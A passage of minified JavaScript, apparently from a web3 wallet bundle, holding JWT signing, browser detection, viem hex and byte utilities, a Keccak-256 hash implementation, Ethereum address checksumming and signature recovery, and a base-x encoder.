    return (e === "utf8" || e === "utf-8") && globalThis.Buffer != null && globalThis.Buffer.from != null ? globalThis.Buffer.from(r.buffer, r.byteOffset, r.byteLength).toString("utf8") : t.encoder.encode(r).substring(1)
}
function Gd(r, e="utf8") {
    const t = YM[e];
    if (!t)
        throw new Error(`Unsupported encoding "${e}"`);
    return (e === "utf8" || e === "utf-8") && globalThis.Buffer != null && globalThis.Buffer.from != null ? P3(globalThis.Buffer.from(r, "utf-8")) : t.decoder.decode(`${t.prefix}${r}`)
}
function cB(r) {
    return Ed(I1(Gd(r, B1), DM))
}
function t1(r) {
    return I1(Gd(uu(r), DM), B1)
}
function XM(r) {
    const e = Gd(PY, tB)
      , t = AY + I1(kM([e, r]), tB);
    return [TY, EY, t].join(vY)
}
function GX(r) {
    return I1(r, B1)
}
function KX(r) {
    return Gd(r, B1)
}
function ZX(r) {
    return Gd([t1(r.header), t1(r.payload)].join(e1), FM)
}
function YX(r) {
    return [t1(r.header), t1(r.payload), GX(r.signature)].join(e1)
}
function NE(r) {
    const e = r.split(e1)
      , t = cB(e[0])
      , o = cB(e[1])
      , i = KX(e[2])
      , n = Gd(e.slice(0, 2).join(e1), FM);
    return {
        header: t,
        payload: o,
        signature: i,
        data: n
    }
}
function lB(r=PM(CY)) {
    const e = NM.getPublicKey(r);
    return {
        secretKey: kM([r, e]),
        publicKey: e
    }
}
async function XX(r, e, t, o, i=Ze.fromMiliseconds(Date.now())) {
    const n = {
        alg: xY,
        typ: wY
    }
      , s = XM(o.publicKey)
      , a = i + t
      , l = {
        iss: s,
        sub: r,
        aud: e,
        iat: i,
        exp: a
    }
      , f = ZX({
        header: n,
        payload: l
    })
      , h = NM.sign(f, o.secretKey.slice(0, 32));
    return YX({
        header: n,
        payload: l,
        signature: h
    })
}
var uB = function(r, e, t) {
    if (t || arguments.length === 2)
        for (var o = 0, i = e.length, n; o < i; o++)
            (n || !(o in e)) && (n || (n = Array.prototype.slice.call(e, 0, o)),
            n[o] = e[o]);
    return r.concat(n || Array.prototype.slice.call(e))
}
  , JX = function() {
    function r(e, t, o) {
        this.name = e,
        this.version = t,
        this.os = o,
        this.type = "browser"
    }
    return r
}()
  , QX = function() {
    function r(e) {
        this.version = e,
        this.type = "node",
        this.name = "node",
        this.os = process.platform
    }
    return r
}()
  , eJ = function() {
    function r(e, t, o, i) {
        this.name = e,
        this.version = t,
        this.os = o,
        this.bot = i,
        this.type = "bot-device"
    }
    return r
}()
  , tJ = function() {
    function r() {
        this.type = "bot",
        this.bot = !0,
        this.name = "bot",
        this.version = null,
        this.os = null
    }
    return r
}()
  , rJ = function() {
    function r() {
        this.type = "react-native",
        this.name = "react-native",
        this.version = null,
        this.os = null
    }
    return r
}()
  , nJ = /alexa|bot|crawl(er|ing)|facebookexternalhit|feedburner|google web preview|nagios|postrank|pingdom|slurp|spider|yahoo!|yandex/
  , oJ = /(nuhk|curl|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask\ Jeeves\/Teoma|ia_archiver)/
  , fB = 3
  , iJ = [["aol", /AOLShield\/([0-9\._]+)/], ["edge", /Edge\/([0-9\._]+)/], ["edge-ios", /EdgiOS\/([0-9\._]+)/], ["yandexbrowser", /YaBrowser\/([0-9\._]+)/], ["kakaotalk", /KAKAOTALK\s([0-9\.]+)/], ["samsung", /SamsungBrowser\/([0-9\.]+)/], ["silk", /\bSilk\/([0-9._-]+)\b/], ["miui", /MiuiBrowser\/([0-9\.]+)$/], ["beaker", /BeakerBrowser\/([0-9\.]+)/], ["edge-chromium", /EdgA?\/([0-9\.]+)/], ["chromium-webview", /(?!Chrom.*OPR)wv\).*Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/], ["chrome", /(?!Chrom.*OPR)Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/], ["phantomjs", /PhantomJS\/([0-9\.]+)(:?\s|$)/], ["crios", /CriOS\/([0-9\.]+)(:?\s|$)/], ["firefox", /Firefox\/([0-9\.]+)(?:\s|$)/], ["fxios", /FxiOS\/([0-9\.]+)/], ["opera-mini", /Opera Mini.*Version\/([0-9\.]+)/], ["opera", /Opera\/([0-9\.]+)(?:\s|$)/], ["opera", /OPR\/([0-9\.]+)(:?\s|$)/], ["pie", /^Microsoft Pocket Internet Explorer\/(\d+\.\d+)$/], ["pie", /^Mozilla\/\d\.\d+\s\(compatible;\s(?:MSP?IE|MSInternet Explorer) (\d+\.\d+);.*Windows CE.*\)$/], ["netfront", /^Mozilla\/\d\.\d+.*NetFront\/(\d.\d)/], ["ie", /Trident\/7\.0.*rv\:([0-9\.]+).*\).*Gecko$/], ["ie", /MSIE\s([0-9\.]+);.*Trident\/[4-7].0/], ["ie", /MSIE\s(7\.0)/], ["bb10", /BB10;\sTouch.*Version\/([0-9\.]+)/], ["android", /Android\s([0-9\.]+)/], ["ios", /Version\/([0-9\._]+).*Mobile.*Safari.*/], ["safari", /Version\/([0-9\._]+).*Safari/], ["facebook", /FB[AS]V\/([0-9\.]+)/], ["instagram", /Instagram\s([0-9\.]+)/], ["ios-webview", /AppleWebKit\/([0-9\.]+).*Mobile/], ["ios-webview", /AppleWebKit\/([0-9\.]+).*Gecko\)$/], ["curl", /^curl\/([0-9\.]+)$/], ["searchbot", nJ]]
  , dB = [["iOS", /iP(hone|od|ad)/], ["Android OS", /Android/], ["BlackBerry OS", /BlackBerry|BB10/], ["Windows Mobile", /IEMobile/], ["Amazon OS", /Kindle/], ["Windows 3.11", /Win16/], ["Windows 95", /(Windows 95)|(Win95)|(Windows_95)/], ["Windows 98", /(Windows 98)|(Win98)/], ["Windows 2000", /(Windows NT 5.0)|(Windows 2000)/], ["Windows XP", /(Windows NT 5.1)|(Windows XP)/], ["Windows Server 2003", /(Windows NT 5.2)/], ["Windows Vista", /(Windows NT 6.0)/], ["Windows 7", /(Windows NT 6.1)/], ["Windows 8", /(Windows NT 6.2)/], ["Windows 8.1", /(Windows NT 6.3)/], ["Windows 10", /(Windows NT 10.0)/], ["Windows ME", /Windows ME/], ["Windows CE", /Windows CE|WinCE|Microsoft Pocket Internet Explorer/], ["Open BSD", /OpenBSD/], ["Sun OS", /SunOS/], ["Chrome OS", /CrOS/], ["Linux", /(Linux)|(X11)/], ["Mac OS", /(Mac_PowerPC)|(Macintosh)/], ["QNX", /QNX/], ["BeOS", /BeOS/], ["OS/2", /OS\/2/]];
function sJ(r) {
    return typeof document > "u" && typeof navigator < "u" && navigator.product === "ReactNative" ? new rJ : typeof navigator < "u" ? cJ(navigator.userAgent) : uJ()
}
function aJ(r) {
    return r !== "" && iJ.reduce(function(e, t) {
        var o = t[0]
          , i = t[1];
        if (e)
            return e;
        var n = i.exec(r);
        return !!n && [o, n]
    }, !1)
}
function cJ(r) {
    var e = aJ(r);
    if (!e)
        return null;
    var t = e[0]
      , o = e[1];
    if (t === "searchbot")
        return new tJ;
    var i = o[1] && o[1].split(".").join("_").split("_").slice(0, 3);
    i ? i.length < fB && (i = uB(uB([], i, !0), fJ(fB - i.length), !0)) : i = [];
    var n = i.join(".")
      , s = lJ(r)
      , a = oJ.exec(r);
    return a && a[1] ? new eJ(t,n,s,a[1]) : new JX(t,n,s)
}
function lJ(r) {
    for (var e = 0, t = dB.length; e < t; e++) {
        var o = dB[e]
          , i = o[0]
          , n = o[1]
          , s = n.exec(r);
        if (s)
            return i
    }
    return null
}
function uJ() {
    var r = typeof process < "u" && process.version;
    return r ? new QX(process.version.slice(1)) : null
}
function fJ(r) {
    for (var e = [], t = 0; t < r; t++)
        e.push("0");
    return e
}
var Rr = {}, hB;
function JM() {
    if (hB)
        return Rr;
    hB = 1,
    Object.defineProperty(Rr, "__esModule", {
        value: !0
    }),
    Rr.getLocalStorage = Rr.getLocalStorageOrThrow = Rr.getCrypto = Rr.getCryptoOrThrow = Rr.getLocation = Rr.getLocationOrThrow = Rr.getNavigator = Rr.getNavigatorOrThrow = Rr.getDocument = Rr.getDocumentOrThrow = Rr.getFromWindowOrThrow = Rr.getFromWindow = void 0;
    function r(b) {
        let v;
        return typeof window < "u" && typeof window[b] < "u" && (v = window[b]),
        v
    }
    Rr.getFromWindow = r;
    function e(b) {
        const v = r(b);
        if (!v)
            throw new Error(`${b} is not defined in Window`);
        return v
    }
    Rr.getFromWindowOrThrow = e;
    function t() {
        return e("document")
    }
    Rr.getDocumentOrThrow = t;
    function o() {
        return r("document")
    }
    Rr.getDocument = o;
    function i() {
        return e("navigator")
    }
    Rr.getNavigatorOrThrow = i;
    function n() {
        return r("navigator")
    }
    Rr.getNavigator = n;
    function s() {
        return e("location")
    }
    Rr.getLocationOrThrow = s;
    function a() {
        return r("location")
    }
    Rr.getLocation = a;
    function l() {
        return e("crypto")
    }
    Rr.getCryptoOrThrow = l;
    function f() {
        return r("crypto")
    }
    Rr.getCrypto = f;
    function h() {
        return e("localStorage")
    }
    Rr.getLocalStorageOrThrow = h;
    function p() {
        return r("localStorage")
    }
    return Rr.getLocalStorage = p,
    Rr
}
var Ha = JM(), fp = {}, pB;
function dJ() {
    if (pB)
        return fp;
    pB = 1,
    Object.defineProperty(fp, "__esModule", {
        value: !0
    }),
    fp.getWindowMetadata = void 0;
    const r = JM();
    function e() {
        let t, o;
        try {
            t = r.getDocumentOrThrow(),
            o = r.getLocationOrThrow()
        } catch {
            return null
        }
        function i() {
            const v = t.getElementsByTagName("link")
              , T = [];
            for (let x = 0; x < v.length; x++) {
                const E = v[x]
                  , B = E.getAttribute("rel");
                if (B && B.toLowerCase().indexOf("icon") > -1) {
                    const P = E.getAttribute("href");
                    if (P)
                        if (P.toLowerCase().indexOf("https:") === -1 && P.toLowerCase().indexOf("http:") === -1 && P.indexOf("//") !== 0) {
                            let O = o.protocol + "//" + o.host;
                            if (P.indexOf("/") === 0)
                                O += P;
                            else {
                                const F = o.pathname.split("/");
                                F.pop();
                                const D = F.join("/");
                                O += D + "/" + P
                            }
                            T.push(O)
                        } else if (P.indexOf("//") === 0) {
                            const O = o.protocol + P;
                            T.push(O)
                        } else
                            T.push(P)
                }
            }
            return T
        }
        function n(...v) {
            const T = t.getElementsByTagName("meta");
            for (let x = 0; x < T.length; x++) {
                const E = T[x]
                  , B = ["itemprop", "property", "name"].map(P => E.getAttribute(P)).filter(P => P ? v.includes(P) : !1);
                if (B.length && B) {
                    const P = E.getAttribute("content");
                    if (P)
                        return P
                }
            }
            return ""
        }
        function s() {
            let v = n("name", "og:site_name", "og:title", "twitter:title");
            return v || (v = t.title),
            v
        }
        function a() {
            return n("description", "og:description", "twitter:description", "keywords")
        }
        const l = s()
          , f = a()
          , h = o.origin
          , p = i();
        return {
            description: f,
            url: h,
            icons: p,
            name: l
        }
    }
    return fp.getWindowMetadata = e,
    fp
}
var hJ = dJ();
function jp(r, {strict: e=!0}={}) {
    return !r || typeof r != "string" ? !1 : e ? /^0x[0-9a-fA-F]*$/.test(r) : r.startsWith("0x")
}
function gB(r) {
    return jp(r, {
        strict: !1
    }) ? Math.ceil((r.length - 2) / 2) : r.length
}
const QM = "2.23.2";
let dp = {
    getDocsUrl: ({docsBaseUrl: r, docsPath: e="", docsSlug: t}) => e ? `${r ?? "https://viem.sh"}${e}${t ? `#${t}` : ""}` : void 0,
    version: `viem@${QM}`
};
class fu extends Error {
    constructor(e, t={}) {
        var a;
        const o = ( () => {
            var l;
            return t.cause instanceof fu ? t.cause.details : (l = t.cause) != null && l.message ? t.cause.message : t.details
        }
        )()
          , i = t.cause instanceof fu && t.cause.docsPath || t.docsPath
          , n = (a = dp.getDocsUrl) == null ? void 0 : a.call(dp, {
            ...t,
            docsPath: i
        })
          , s = [e || "An error occurred.", "", ...t.metaMessages ? [...t.metaMessages, ""] : [], ...n ? [`Docs: ${n}`] : [], ...o ? [`Details: ${o}`] : [], ...dp.version ? [`Version: ${dp.version}`] : []].join(`
`);
        super(s, t.cause ? {
            cause: t.cause
        } : void 0),
        Object.defineProperty(this, "details", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }),
        Object.defineProperty(this, "docsPath", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }),
        Object.defineProperty(this, "metaMessages", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }),
        Object.defineProperty(this, "shortMessage", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }),
        Object.defineProperty(this, "version", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }),
        Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "BaseError"
        }),
        this.details = o,
        this.docsPath = i,
        this.metaMessages = t.metaMessages,
        this.name = t.name ?? this.name,
        this.shortMessage = e,
        this.version = QM
    }
    walk(e) {
        return eN(this, e)
    }
}
function eN(r, e) {
    return e != null && e(r) ? r : r && typeof r == "object" && "cause"in r && r.cause !== void 0 ? eN(r.cause, e) : e ? null : r
}
class tN extends fu {
    constructor({size: e, targetSize: t, type: o}) {
        super(`${o.charAt(0).toUpperCase()}${o.slice(1).toLowerCase()} size (${e}) exceeds padding size (${t}).`, {
            name: "SizeExceedsPaddingSizeError"
        })
    }
}
function Kd(r, {dir: e, size: t=32}={}) {
    return typeof r == "string" ? pJ(r, {
        dir: e,
        size: t
    }) : gJ(r, {
        dir: e,
        size: t
    })
}
function pJ(r, {dir: e, size: t=32}={}) {
    if (t === null)
        return r;
    const o = r.replace("0x", "");
    if (o.length > t * 2)
        throw new tN({
            size: Math.ceil(o.length / 2),
            targetSize: t,
            type: "hex"
        });
    return `0x${o[e === "right" ? "padEnd" : "padStart"](t * 2, "0")}`
}
function gJ(r, {dir: e, size: t=32}={}) {
    if (t === null)
        return r;
    if (r.length > t)
        throw new tN({
            size: r.length,
            targetSize: t,
            type: "bytes"
        });
    const o = new Uint8Array(t);
    for (let i = 0; i < t; i++) {
        const n = e === "right";
        o[n ? i : t - i - 1] = r[n ? i : r.length - i - 1]
    }
    return o
}
class yJ extends fu {
    constructor({max: e, min: t, signed: o, size: i, value: n}) {
        super(`Number "${n}" is not in safe ${i ? `${i * 8}-bit ${o ? "signed" : "unsigned"} ` : ""}integer range ${e ? `(${t} to ${e})` : `(above ${t})`}`, {
            name: "IntegerOutOfRangeError"
        })
    }
}
class bJ extends fu {
    constructor({givenSize: e, maxSize: t}) {
        super(`Size cannot exceed ${t} bytes. Given size: ${e} bytes.`, {
            name: "SizeOverflowError"
        })
    }
}
function Zd(r, {size: e}) {
    if (gB(r) > e)
        throw new bJ({
            givenSize: gB(r),
            maxSize: e
        })
}
function DE(r, e={}) {
    const {signed: t} = e;
    e.size && Zd(r, {
        size: e.size
    });
    const o = BigInt(r);
    if (!t)
        return o;
    const i = (r.length - 2) / 2
      , n = (1n << BigInt(i) * 8n - 1n) - 1n;
    return o <= n ? o : o - BigInt(`0x${"f".padStart(i * 2, "f")}`) - 1n
}
function mJ(r, e={}) {
    return Number(DE(r, e))
}
const xJ = Array.from({
    length: 256
}, (r, e) => e.toString(16).padStart(2, "0"));
function FE(r, e={}) {
    return typeof r == "number" || typeof r == "bigint" ? nN(r, e) : typeof r == "string" ? TJ(r, e) : typeof r == "boolean" ? wJ(r, e) : rN(r, e)
}
function wJ(r, e={}) {
    const t = `0x${Number(r)}`;
    return typeof e.size == "number" ? (Zd(t, {
        size: e.size
    }),
    Kd(t, {
        size: e.size
    })) : t
}
function rN(r, e={}) {
    let t = "";
    for (let i = 0; i < r.length; i++)
        t += xJ[r[i]];
    const o = `0x${t}`;
    return typeof e.size == "number" ? (Zd(o, {
        size: e.size
    }),
    Kd(o, {
        dir: "right",
        size: e.size
    })) : o
}
function nN(r, e={}) {
    const {signed: t, size: o} = e
      , i = BigInt(r);
    let n;
    o ? t ? n = (1n << BigInt(o) * 8n - 1n) - 1n : n = 2n ** (BigInt(o) * 8n) - 1n : typeof r == "number" && (n = BigInt(Number.MAX_SAFE_INTEGER));
    const s = typeof n == "bigint" && t ? -n - 1n : 0;
    if (n && i > n || i < s) {
        const l = typeof r == "bigint" ? "n" : "";
        throw new yJ({
            max: n ? `${n}${l}` : void 0,
            min: `${s}${l}`,
            signed: t,
            size: o,
            value: `${r}${l}`
        })
    }
    const a = `0x${(t && i < 0 ? (1n << BigInt(o * 8)) + BigInt(i) : i).toString(16)}`;
    return o ? Kd(a, {
        size: o
    }) : a
}
const vJ = new TextEncoder;
function TJ(r, e={}) {
    const t = vJ.encode(r);
    return rN(t, e)
}
const EJ = new TextEncoder;
function AJ(r, e={}) {
    return typeof r == "number" || typeof r == "bigint" ? CJ(r, e) : typeof r == "boolean" ? PJ(r, e) : jp(r) ? oN(r, e) : iN(r, e)
}
function PJ(r, e={}) {
    const t = new Uint8Array(1);
    return t[0] = Number(r),
    typeof e.size == "number" ? (Zd(t, {
        size: e.size
    }),
    Kd(t, {
        size: e.size
    })) : t
}
const ma = {
    zero: 48,
    nine: 57,
    A: 65,
    F: 70,
    a: 97,
    f: 102
};
function yB(r) {
    if (r >= ma.zero && r <= ma.nine)
        return r - ma.zero;
    if (r >= ma.A && r <= ma.F)
        return r - (ma.A - 10);
    if (r >= ma.a && r <= ma.f)
        return r - (ma.a - 10)
}
function oN(r, e={}) {
    let t = r;
    e.size && (Zd(t, {
        size: e.size
    }),
    t = Kd(t, {
        dir: "right",
        size: e.size
    }));
    let o = t.slice(2);
    o.length % 2 && (o = `0${o}`);
    const i = o.length / 2
      , n = new Uint8Array(i);
    for (let s = 0, a = 0; s < i; s++) {
        const l = yB(o.charCodeAt(a++))
          , f = yB(o.charCodeAt(a++));
        if (l === void 0 || f === void 0)
            throw new fu(`Invalid byte sequence ("${o[a - 2]}${o[a - 1]}" in "${o}").`);
        n[s] = l * 16 + f
    }
    return n
}
function CJ(r, e) {
    const t = nN(r, e);
    return oN(t)
}
function iN(r, e={}) {
    const t = EJ.encode(r);
    return typeof e.size == "number" ? (Zd(t, {
        size: e.size
    }),
    Kd(t, {
        dir: "right",
        size: e.size
    })) : t
}
function r1(r) {
    if (!Number.isSafeInteger(r) || r < 0)
        throw new Error("positive integer expected, got " + r)
}
function SJ(r) {
    return r instanceof Uint8Array || ArrayBuffer.isView(r) && r.constructor.name === "Uint8Array"
}
function O1(r, ...e) {
    if (!SJ(r))
        throw new Error("Uint8Array expected");
    if (e.length > 0 && !e.includes(r.length))
        throw new Error("Uint8Array expected of length " + e + ", got length=" + r.length)
}
function _1e(r) {
    if (typeof r != "function" || typeof r.create != "function")
        throw new Error("Hash should be wrapped by utils.wrapConstructor");
    r1(r.outputLen),
    r1(r.blockLen)
}
function bB(r, e=!0) {
    if (r.destroyed)
        throw new Error("Hash instance has been destroyed");
    if (e && r.finished)
        throw new Error("Hash#digest() has already been called")
}
function BJ(r, e) {
    O1(r);
    const t = e.outputLen;
    if (r.length < t)
        throw new Error("digestInto() expects output buffer of length at least " + t)
}
const ly = BigInt(2 ** 32 - 1)
  , mB = BigInt(32);
function _J(r, e=!1) {
    return e ? {
        h: Number(r & ly),
        l: Number(r >> mB & ly)
    } : {
        h: Number(r >> mB & ly) | 0,
        l: Number(r & ly) | 0
    }
}
function IJ(r, e=!1) {
    let t = new Uint32Array(r.length)
      , o = new Uint32Array(r.length);
    for (let i = 0; i < r.length; i++) {
        const {h: n, l: s} = _J(r[i], e);
        [t[i],o[i]] = [n, s]
    }
    return [t, o]
}
const OJ = (r, e, t) => r << t | e >>> 32 - t
  , RJ = (r, e, t) => e << t | r >>> 32 - t
  , WJ = (r, e, t) => e << t - 32 | r >>> 64 - t
  , MJ = (r, e, t) => r << t - 32 | e >>> 64 - t
  , bf = typeof globalThis == "object" && "crypto"in globalThis ? globalThis.crypto : void 0;
/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */
function NJ(r) {
    return new Uint32Array(r.buffer,r.byteOffset,Math.floor(r.byteLength / 4))
}
function I1e(r) {
    return new DataView(r.buffer,r.byteOffset,r.byteLength)
}
function O1e(r, e) {
    return r << 32 - e | r >>> e
}
const xB = new Uint8Array(new Uint32Array([287454020]).buffer)[0] === 68;
function DJ(r) {
    return r << 24 & 4278190080 | r << 8 & 16711680 | r >>> 8 & 65280 | r >>> 24 & 255
}
function wB(r) {
    for (let e = 0; e < r.length; e++)
        r[e] = DJ(r[e])
}
function FJ(r) {
    if (typeof r != "string")
        throw new Error("utf8ToBytes expected string, got " + typeof r);
    return new Uint8Array(new TextEncoder().encode(r))
}
function sN(r) {
    return typeof r == "string" && (r = FJ(r)),
    O1(r),
    r
}
function R1e(...r) {
    let e = 0;
    for (let o = 0; o < r.length; o++) {
        const i = r[o];
        O1(i),
        e += i.length
    }
    const t = new Uint8Array(e);
    for (let o = 0, i = 0; o < r.length; o++) {
        const n = r[o];
        t.set(n, i),
        i += n.length
    }
    return t
}
let UJ = class {
    clone() {
        return this._cloneInto()
    }
}
;
function kJ(r) {
    const e = o => r().update(sN(o)).digest()
      , t = r();
    return e.outputLen = t.outputLen,
    e.blockLen = t.blockLen,
    e.create = () => r(),
    e
}
function M1e(r=32) {
    if (bf && typeof bf.getRandomValues == "function")
        return bf.getRandomValues(new Uint8Array(r));
    if (bf && typeof bf.randomBytes == "function")
        return bf.randomBytes(r);
    throw new Error("crypto.getRandomValues must be defined")
}
const aN = []
  , cN = []
  , lN = []
  , LJ = BigInt(0)
  , hp = BigInt(1)
  , $J = BigInt(2)
  , zJ = BigInt(7)
  , jJ = BigInt(256)
  , qJ = BigInt(113);
for (let r = 0, e = hp, t = 1, o = 0; r < 24; r++) {
    [t,o] = [o, (2 * t + 3 * o) % 5],
    aN.push(2 * (5 * o + t)),
    cN.push((r + 1) * (r + 2) / 2 % 64);
    let i = LJ;
    for (let n = 0; n < 7; n++)
        e = (e << hp ^ (e >> zJ) * qJ) % jJ,
        e & $J && (i ^= hp << (hp << BigInt(n)) - hp);
    lN.push(i)
}
const [VJ,HJ] = IJ(lN, !0)
  , vB = (r, e, t) => t > 32 ? WJ(r, e, t) : OJ(r, e, t)
  , TB = (r, e, t) => t > 32 ? MJ(r, e, t) : RJ(r, e, t);
function GJ(r, e=24) {
    const t = new Uint32Array(10);
    for (let o = 24 - e; o < 24; o++) {
        for (let s = 0; s < 10; s++)
            t[s] = r[s] ^ r[s + 10] ^ r[s + 20] ^ r[s + 30] ^ r[s + 40];
        for (let s = 0; s < 10; s += 2) {
            const a = (s + 8) % 10
              , l = (s + 2) % 10
              , f = t[l]
              , h = t[l + 1]
              , p = vB(f, h, 1) ^ t[a]
              , b = TB(f, h, 1) ^ t[a + 1];
            for (let v = 0; v < 50; v += 10)
                r[s + v] ^= p,
                r[s + v + 1] ^= b
        }
        let i = r[2]
          , n = r[3];
        for (let s = 0; s < 24; s++) {
            const a = cN[s]
              , l = vB(i, n, a)
              , f = TB(i, n, a)
              , h = aN[s];
            i = r[h],
            n = r[h + 1],
            r[h] = l,
            r[h + 1] = f
        }
        for (let s = 0; s < 50; s += 10) {
            for (let a = 0; a < 10; a++)
                t[a] = r[s + a];
            for (let a = 0; a < 10; a++)
                r[s + a] ^= ~t[(a + 2) % 10] & t[(a + 4) % 10]
        }
        r[0] ^= VJ[o],
        r[1] ^= HJ[o]
    }
    t.fill(0)
}
let KJ = class uN extends UJ {
    constructor(e, t, o, i=!1, n=24) {
        if (super(),
        this.blockLen = e,
        this.suffix = t,
        this.outputLen = o,
        this.enableXOF = i,
        this.rounds = n,
        this.pos = 0,
        this.posOut = 0,
        this.finished = !1,
        this.destroyed = !1,
        r1(o),
        0 >= this.blockLen || this.blockLen >= 200)
            throw new Error("Sha3 supports only keccak-f1600 function");
        this.state = new Uint8Array(200),
        this.state32 = NJ(this.state)
    }
    keccak() {
        xB || wB(this.state32),
        GJ(this.state32, this.rounds),
        xB || wB(this.state32),
        this.posOut = 0,
        this.pos = 0
    }
    update(e) {
        bB(this);
        const {blockLen: t, state: o} = this;
        e = sN(e);
        const i = e.length;
        for (let n = 0; n < i; ) {
            const s = Math.min(t - this.pos, i - n);
            for (let a = 0; a < s; a++)
                o[this.pos++] ^= e[n++];
            this.pos === t && this.keccak()
        }
        return this
    }
    finish() {
        if (this.finished)
            return;
        this.finished = !0;
        const {state: e, suffix: t, pos: o, blockLen: i} = this;
        e[o] ^= t,
        (t & 128) !== 0 && o === i - 1 && this.keccak(),
        e[i - 1] ^= 128,
        this.keccak()
    }
    writeInto(e) {
        bB(this, !1),
        O1(e),
        this.finish();
        const t = this.state
          , {blockLen: o} = this;
        for (let i = 0, n = e.length; i < n; ) {
            this.posOut >= o && this.keccak();
            const s = Math.min(o - this.posOut, n - i);
            e.set(t.subarray(this.posOut, this.posOut + s), i),
            this.posOut += s,
            i += s
        }
        return e
    }
    xofInto(e) {
        if (!this.enableXOF)
            throw new Error("XOF is not possible for this instance");
        return this.writeInto(e)
    }
    xof(e) {
        return r1(e),
        this.xofInto(new Uint8Array(e))
    }
    digestInto(e) {
        if (BJ(e, this),
        this.finished)
            throw new Error("digest() was already called");
        return this.writeInto(e),
        this.destroy(),
        e
    }
    digest() {
        return this.digestInto(new Uint8Array(this.outputLen))
    }
    destroy() {
        this.destroyed = !0,
        this.state.fill(0)
    }
    _cloneInto(e) {
        const {blockLen: t, suffix: o, outputLen: i, rounds: n, enableXOF: s} = this;
        return e || (e = new uN(t,o,i,s,n)),
        e.state32.set(this.state32),
        e.pos = this.pos,
        e.posOut = this.posOut,
        e.finished = this.finished,
        e.rounds = n,
        e.suffix = o,
        e.outputLen = i,
        e.enableXOF = s,
        e.destroyed = this.destroyed,
        e
    }
}
;
const ZJ = (r, e, t) => kJ( () => new KJ(e,r,t))
  , YJ = ZJ(1, 136, 256 / 8);
function fN(r, e) {
    const t = e || "hex"
      , o = YJ(jp(r, {
        strict: !1
    }) ? AJ(r) : r);
    return t === "bytes" ? o : FE(o)
}
class XJ extends Map {
    constructor(e) {
        super(),
        Object.defineProperty(this, "maxSize", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }),
        this.maxSize = e
    }
    get(e) {
        const t = super.get(e);
        return super.has(e) && t !== void 0 && (this.delete(e),
        super.set(e, t)),
        t
    }
    set(e, t) {
        if (super.set(e, t),
        this.maxSize && this.size > this.maxSize) {
            const o = this.keys().next().value;
            o && this.delete(o)
        }
        return this
    }
}
const c2 = new XJ(8192);
function JJ(r, e) {
    if (c2.has(`${r}.${e}`))
        return c2.get(`${r}.${e}`);
    const t = r.substring(2).toLowerCase()
      , o = fN(iN(t), "bytes")
      , i = t.split("");
    for (let s = 0; s < 40; s += 2)
        o[s >> 1] >> 4 >= 8 && i[s] && (i[s] = i[s].toUpperCase()),
        (o[s >> 1] & 15) >= 8 && i[s + 1] && (i[s + 1] = i[s + 1].toUpperCase());
    const n = `0x${i.join("")}`;
    return c2.set(`${r}.${e}`, n),
    n
}
function QJ(r) {
    const e = fN(`0x${r.substring(4)}`).substring(26);
    return JJ(`0x${e}`)
}
async function eQ({hash: r, signature: e}) {
    const t = jp(r) ? r : FE(r)
      , {secp256k1: o} = await gM(async () => {
        const {secp256k1: s} = await import("./secp256k1-iceqGGht.js");
        return {
            secp256k1: s
        }
    }
    , []);
    return `0x${( () => {
        if (typeof e == "object" && "r"in e && "s"in e) {
            const {r: f, s: h, v: p, yParity: b} = e
              , v = Number(b ?? p)
              , T = EB(v);
            return new o.Signature(DE(f),DE(h)).addRecoveryBit(T)
        }
        const s = jp(e) ? e : FE(e)
          , a = mJ(`0x${s.slice(130)}`)
          , l = EB(a);
        return o.Signature.fromCompact(s.substring(2, 130)).addRecoveryBit(l)
    }
    )().recoverPublicKey(t.substring(2)).toHex(!1)}`
}
function EB(r) {
    if (r === 0 || r === 1)
        return r;
    if (r === 27)
        return 0;
    if (r === 28)
        return 1;
    throw new Error("Invalid yParityOrV value")
}
async function tQ({hash: r, signature: e}) {
    return QJ(await eQ({
        hash: r,
        signature: e
    }))
}
function rQ(r) {
    if (r.length >= 255)
        throw new TypeError("Alphabet too long");
    const e = new Uint8Array(256);
    for (let f = 0; f < e.length; f++)
        e[f] = 255;
    for (let f = 0; f < r.length; f++) {
        const h = r.charAt(f)
          , p = h.charCodeAt(0);
        if (e[p] !== 255)
            throw new TypeError(h + " is ambiguous");
        e[p] = f
    }
    const t = r.length
      , o = r.charAt(0)
      , i = Math.log(t) / Math.log(256)
      , n = Math.log(256) / Math.log(t);
    function s(f) {
        if (f instanceof Uint8Array || (ArrayBuffer.isView(f) ? f = new Uint8Array(f.buffer,f.byteOffset,f.byteLength) : Array.isArray(f) && (f = Uint8Array.from(f))),
        !(f instanceof Uint8Array))
            throw new TypeError("Expected Uint8Array");
        if (f.length === 0)
            return "";
        let h = 0
          , p = 0
          , b = 0;
        const v = f.length;
        for (; b !== v && f[b] === 0; )
            b++,
            h++;
        const T = (v - b) * n + 1 >>> 0
          , x = new Uint8Array(T);
        for (; b !== v; ) {
            let P = f[b]
              , O = 0;
            for (let F = T - 1; (P !== 0 || O < p) && F !== -1; F--,
            O++)
                P += 256 * x[F] >>> 0,
                x[F] = P % t >>> 0,
                P = P / t >>> 0;
            if (P !== 0)
                throw new Error("Non-zero carry");
            p = O,
            b++
        }
        let E = T - p;
        for (; E !== T && x[E] === 0; )
            E++;
        let B = o.repeat(h);
        for (; E < T; ++E)
            B += r.charAt(x[E]);
        return B
    }
    function a(f) {
        if (typeof f != "string")
            throw new TypeError("Expected String");
        if (f.length === 0)
            return new Uint8Array;
        let h = 0
          , p = 0
          , b = 0;
        for (; f[h] === o; )
            p++,
            h++;
        const v = (f.length - h) * i + 1 >>> 0
          , T = new Uint8Array(v);
        for (; h < f.length; ) {
            const P = f.charCodeAt(h);
            if (P > 255)
                return;
            let O = e[P];
            if (O === 255)
                return;
            let F = 0;
